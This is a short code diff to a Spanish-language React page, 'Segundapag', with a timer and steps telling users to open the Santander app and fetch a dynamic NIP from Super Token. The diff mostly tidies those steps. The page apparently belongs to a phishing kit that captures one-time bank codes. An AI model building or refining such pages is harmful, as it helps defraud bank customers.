@@ -71,18 +71,18 @@ function Segundapag() {
           Tiempo restante: {formatTime(timeLeft)}
         </div>
         <button type="submit" className="auth-continue-button" disabled={timeLeft === 0}>Continuar</button>
-        {/*dlefekfpekfpktexto */}
         <p className="auth-info-text">
           Si tienes problemas para obtener el NIP, por favor contacta a soporte técnico.
         </p>
-      1 Abre tu aplicacion Santander 
-      2 En la parte de abajo selecciona la opcion "super token" 
-      3 Ingresa tu clave super Token Para obtener nip dinamico
-      
+        <div className="instructions">
+          <p>1. Abre tu aplicación Santander.</p>
+          <p>2. En la parte de abajo selecciona la opción "Super Token".</p>
+          <p>3. Ingresa tu clave de Super Token para obtener el NIP dinámico.</p>
+        </div>
       </form>
     </div>
   );
 }
-.
+
 export default Segundapag;
 
